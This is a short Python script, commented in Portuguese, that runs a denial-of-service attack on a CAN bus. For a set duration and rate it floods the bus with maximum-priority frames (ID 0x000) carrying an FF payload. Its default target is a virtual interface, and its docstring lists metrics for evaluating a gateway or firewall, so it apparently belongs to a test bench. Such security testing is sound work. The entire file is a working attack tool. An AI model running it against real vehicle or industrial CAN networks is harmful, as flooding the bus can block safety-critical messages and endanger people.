#!/usr/bin/env python3
"""
Injetar continuamente quadros com ID 0x000 (a maior prioridade possível)
Métricas para a etapa 3:
    - Latência adicional das mensagens legítimas (jitter)
    - Taxa de quadros perdidos (frame drop rate)
    - Utilização do barramento (bus load %)
    - Overhead de CPU no Gateway/Firewall
"""
import argparse
import time
import sys
import can


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Ataque DoS em barramento CAN")
    p.add_argument("--iface", default="vcan0", help="Interface CAN")
    p.add_argument("--id", type=lambda x: int(x, 0), default=0x000, 
                   help="ID da mensagem maliciosa")
    p.add_argument("--duration", type=float, default=30.0,
                   help="Duração do ataque em segundos")
    p.add_argument("--rate", type=float, default=0.0,
                   help="Intervalo entre frames em ms") # 0 = máxima vazão
    p.add_argument("--payload", default="FF FF FF FF FF FF FF FF",
                   help="Payload em hex separado por espaços (8 bytes)")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    payload = bytes(int(b, 16) for b in args.payload.split())
    bus = can.interface.Bus(channel=args.iface, bustype="socketcan")
    msg = can.Message(arbitration_id=args.id, data=payload, is_extended_id=False)

    print(f"[INFO] Iniciando DoS em {args.iface} | "
          f"ID=0x{args.id:03X} | duração={args.duration}s | "
          f"intervalo={args.rate}ms")

    sent = 0
    t0 = time.perf_counter()
    deadline = t0 + args.duration
    interval_s = args.rate / 1000.0

    try:
        while time.perf_counter() < deadline:
            bus.send(msg)
            sent += 1
            if interval_s > 0:
                time.sleep(interval_s)
    except can.CanError as e:
        print(f"[ERRO] Falha de transmissão: {e}", file=sys.stderr)
    except KeyboardInterrupt:
        print("\n[INFO] Interrompido pelo usuário.")
    finally:
        elapsed = time.perf_counter() - t0
        bus.shutdown()
        print(f"[RESULTADO] Frames enviados: {sent} | "
              f"Tempo: {elapsed:.3f}s | "
              f"Taxa média: {sent/elapsed:.0f} fps")


if __name__ == "__main__":
    main()
